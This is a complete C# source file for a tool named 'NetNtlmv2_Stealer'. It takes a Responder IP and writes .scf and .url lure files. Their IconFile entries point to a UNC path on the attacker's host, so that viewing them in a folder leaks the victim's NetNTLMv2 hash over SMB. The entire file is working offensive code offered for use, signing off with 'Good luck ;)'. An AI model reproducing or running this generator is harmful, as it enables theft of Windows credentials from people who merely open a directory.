using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace NetNtlmv2_Stealer
{
    public class Generate
    {
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("[-] Usage: <Responder IP> <Output File Name>");
                return;
            }

            string ip = args[0];
            string filename = args[1];

            // File templates
            string[] templates = new string[2] {
@$"[Shell]
Command=2
IconFile=\\{ip}\share\%USERNAME%.ico
[Taskbar]
Command=ToggleDesktop",
$@"[InternetShortcut]
URL=https://ired.team
WorkingDirectory=C:\Users\Public
IconFile=\\{ip}\%USERNAME%.icon
IconIndex=1"
            };

            // Create files
            string pwd = Directory.GetCurrentDirectory();

            string[] filenames = new string[2] {
                Path.Join(pwd, filename + ".scf"),
                Path.Join(pwd, filename + ".url"),
            };

            for(int i = 0; i < 2; i++) {
                try
                {
                    using (FileStream fs = File.Create(filenames[i]))
                    {
                        byte[] file_contents = Encoding.UTF8.GetBytes(templates[i]);
                        fs.Write(file_contents, 0, file_contents.Length);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[+] Failed to generate '{filenames[i]}': " + ex.ToString());
                }

                Console.WriteLine($"[+] Generated '{filenames[i]}'");
            }

            Console.WriteLine("[+] Your files have been generated! Good luck ;)");
        }
    }
}
